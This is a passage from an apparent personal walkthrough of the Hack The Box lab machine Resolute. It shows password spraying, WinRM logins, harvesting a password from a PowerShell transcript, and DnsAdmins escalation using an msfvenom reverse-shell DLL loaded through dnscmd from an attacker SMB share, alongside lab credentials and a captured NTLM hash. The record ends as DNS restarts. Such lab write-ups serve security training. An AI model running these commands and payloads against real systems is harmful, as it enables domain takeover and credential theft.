+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
+SMB         10.10.10.169    445    RESOLUTE         498: MEGABANK\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         500: MEGABANK\Administrator (SidTypeUser)
+SMB         10.10.10.169    445    RESOLUTE         501: MEGABANK\Guest (SidTypeUser)
+SMB         10.10.10.169    445    RESOLUTE         502: MEGABANK\krbtgt (SidTypeUser)
+SMB         10.10.10.169    445    RESOLUTE         503: MEGABANK\DefaultAccount (SidTypeUser)
+SMB         10.10.10.169    445    RESOLUTE         512: MEGABANK\Domain Admins (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         513: MEGABANK\Domain Users (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         514: MEGABANK\Domain Guests (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         515: MEGABANK\Domain Computers (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         516: MEGABANK\Domain Controllers (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         517: MEGABANK\Cert Publishers (SidTypeAlias)
+SMB         10.10.10.169    445    RESOLUTE         518: MEGABANK\Schema Admins (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         519: MEGABANK\Enterprise Admins (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         520: MEGABANK\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         521: MEGABANK\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         522: MEGABANK\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         525: MEGABANK\Protected Users (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         526: MEGABANK\Key Admins (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         527: MEGABANK\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         553: MEGABANK\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.10.169    445    RESOLUTE         571: MEGABANK\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.10.169    445    RESOLUTE         572: MEGABANK\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.10.169    445    RESOLUTE         1000: MEGABANK\RESOLUTE$ (SidTypeUser)
+SMB         10.10.10.169    445    RESOLUTE         1101: MEGABANK\DnsAdmins (SidTypeAlias)
+SMB         10.10.10.169    445    RESOLUTE         1102: MEGABANK\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         1103: MEGABANK\Contractors (SidTypeGroup)
+SMB         10.10.10.169    445    RESOLUTE         1104: MEGABANK\MS02$ (SidTypeUser)
+SMB         10.10.10.169    445    RESOLUTE         1105: MEGABANK\ryan (SidTypeUser)
+SMB         10.10.10.169    445    RESOLUTE         1111: MEGABANK\marko (SidTypeUser)
+</code></pre><h3 id="18ed1b9f-8847-8074-962d-ff830eceb2a4" class="">Yep</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8028-9364-e665e19b2502" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">melanie:Welcome123!</code></pre><h3 id="18ed1b9f-8847-80c4-ba86-e96cbee264e8" class="">User</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-801c-9582-c8d090516cce" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">                                                                                                                 
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Resolute]
+└─$ evil-winrm -i 10.10.10.169 -u melanie -p &#x27;Welcome123!&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\melanie\Documents&gt; type ../Desktop/user.txt
+51536477baea199918de28952d1b7a45
+</code></pre><h1 id="18ed1b9f-8847-8198-9e4e-fbe9c3f665f1" class="">Root</h1><h3 id="18ed1b9f-8847-800d-b1e0-e3660c7047be" class="">Information Gathering</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-803e-8c98-d4ecd43aea68" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; hostname
+Resolute
+*Evil-WinRM* PS C:\Users\melanie\Documents&gt; net user melanie
+User name                    melanie
+Full Name
+Comment
+User&#x27;s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/2/2025 10:35:02 AM
+Password expires             Never
+Password changeable          2/3/2025 10:35:02 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   2/2/2025 10:16:11 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\melanie\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre><h3 id="18ed1b9f-8847-8098-804c-cd54dba17e39" class="">Winpeas</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-80a1-9d03-c0a7382c014c" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\melanie\Desktop&gt; upload winPEASx64_ofs.exe
+                                        
+Info: Uploading /home/drroot/Desktop/.htb/winPEASx64_ofs.exe to C:\Users\melanie\Desktop\winPEASx64_ofs.exe
+                                        
+Data: 12930388 bytes of 12930388 bytes copied
+                                        
+Info: Upload successful!
+
+</code></pre><h3 id="18ed1b9f-8847-80a2-9104-e4be7793c8ec" class="">But nothing “interesting”</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-807f-a844-ef5c28116ce6" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Windows\System32\LogFiles&gt; (Get-PSReadlineOption).HistorySavePath
+
+C:\Users\melanie\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ServerRemoteHost_history.txt
+
+PSModulePath: C:\Users\melanie\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+
+C:\Users\Default
+     C:\Users\Default User
+     C:\Users\Default
+     C:\Users\All Users
+
+</code></pre><h3 id="18ed1b9f-8847-80b1-8e9a-c2ad26e14287" class="">Search for files</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-800b-9587-d8c2cf931c93" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; Get-ChildItem -Force
+
+
+    Directory: C:\PSTranscripts\20191203
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+</code></pre><h3 id="18ed1b9f-8847-8080-981f-fa7ebc469a3b" class="">Creds</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-80e5-ba94-f03770e23566" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063201
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+Command start time: 20191203063455
+**********************
+PS&gt;TerminatingError(): &quot;System error.&quot;
+&gt;&gt; CommandInvocation(Invoke-Expression): &quot;Invoke-Expression&quot;
+&gt;&gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;-join($id,&#x27;PS &#x27;,$(whoami),&#x27;@&#x27;,$env:computername,&#x27; &#x27;,$((gi $pwd).Name),&#x27;&gt; &#x27;)
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }&quot;
+&gt;&gt; CommandInvocation(Out-String): &quot;Out-String&quot;
+&gt;&gt; ParameterBinding(Out-String): name=&quot;Stream&quot;; value=&quot;True&quot;
+**********************
+Command start time: 20191203063455
+**********************
+PS&gt;ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;PS megabank\ryan@RESOLUTE Documents&gt; &quot;
+PS megabank\ryan@RESOLUTE Documents&gt;
+**********************
+Command start time: 20191203063515
+**********************
+PS&gt;CommandInvocation(Invoke-Expression): &quot;Invoke-Expression&quot;
+&gt;&gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }&quot;
+&gt;&gt; CommandInvocation(Out-String): &quot;Out-String&quot;
+&gt;&gt; ParameterBinding(Out-String): name=&quot;Stream&quot;; value=&quot;True&quot;
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+**********************
+Command start time: 20191203063515
+**********************
+PS&gt;CommandInvocation(Out-String): &quot;Out-String&quot;
+&gt;&gt; ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;The syntax of this command is:&quot;
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-80ef-a6f6-f1272792dbe2" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">ryan:Serv3r4Admin4cc123!</code></pre><h3 id="18ed1b9f-8847-805f-8ad4-deb22725c3b6" class="">Shell as Ryan</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8033-9277-fe7904e66121" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Resolute]
+└─$ evil-winrm -i 10.10.10.169 -u ryan -p &#x27;Serv3r4Admin4cc123!&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ryan\Documents&gt; 
+</code></pre><h3 id="18ed1b9f-8847-8072-b8aa-e7f2e69b7d47" class="">Information gather</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8015-9998-e02997bc66f0" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; net user ryan
+User name                    ryan
+Full Name                    Ryan Bertrand
+Comment
+User&#x27;s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/2/2025 1:44:02 PM
+Password expires             Never
+Password changeable          2/3/2025 1:44:02 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Contractors
+The command completed successfully.
+</code></pre><h3 id="18ed1b9f-8847-8012-8be3-c728c87d033b" class="">Groups → dnsadmin danger!</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-80d8-80bc-c0c466738141" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+</code></pre><h3 id="18ed1b9f-8847-809d-a325-f101defc57f4" class="">PrivEsc with <a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">dnsadmin</a></h3><h3 id="18ed1b9f-8847-8083-bd3b-c0f51e9abb0b" class="">Create payload</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8091-90c8-cf92bc0a748b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Resolute]
+└─$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=1205 -f dll &gt; privesc.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+</code></pre><h3 id="18ed1b9f-8847-806a-badd-fd2035936b50" class="">Open smb-server on the directory of payload</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8076-8f00-f24555f72ccf" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Resolute]
+└─$ sudo impacket-smbserver share ./
+[sudo] password for drroot: 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.169,49718)
+[*] AUTHENTICATE_MESSAGE (\,RESOLUTE)
+[*] User RESOLUTE\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[*] NetrShareEnum Level: 1
+[*] NetrServerGetInfo Level: 101
+[*] Disconnecting Share(1:IPC$)
+[*] Closing down connection (10.10.10.169,49718)
+[*] Remaining connections []
+[*] Incoming connection (10.10.10.169,49780)
+[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
+[*] User RESOLUTE\RESOLUTE$ authenticated successfully
+[*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:1208dc573d15cadf1a6b718ea6cf163a:010100000000000000c285b1c275db0132d518c83a6a028700000000010010006e004b00620073005700750059004e00030010006e004b00620073005700750059004e00020010006d006e00640066006800700044007100040010006d006e006400660068007000440071000700080000c285b1c275db010600040002000000080030003000000000000000000000000040000021810441e593535351d5ac4b48fd282474c239984a6ff0a95d4a2e33f58d51fa0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320033000000000000000000
+
+
+</code></pre><h3 id="18ed1b9f-8847-804b-a673-ca58d87b0e9b" class="">NC Listener</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-80a6-b5a4-ca0ac11a3300" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">──(drroot㉿drroot)-[~/Desktop/.htb/Resolute]
+└─$ nc -lnvp 1205                                                   
+listening on [any] 1205 ...</code></pre><h3 id="18ed1b9f-8847-8058-a069-ec49dced543e" class="">Config dns with the new dns on our smb-server</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-80d9-a880-c4d2295fee3b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">**Evil-WinRM* PS C:\Windows\System32&gt; .\dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.23\share\privesc.dll
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+
+*Evil-WinRM* PS C:\Windows\System32&gt; sc.exe \\resolute.megabank.local stop dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+*Evil-WinRM* PS C:\Windows\System32&gt; sc.exe \\resolute.megabank.local start dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
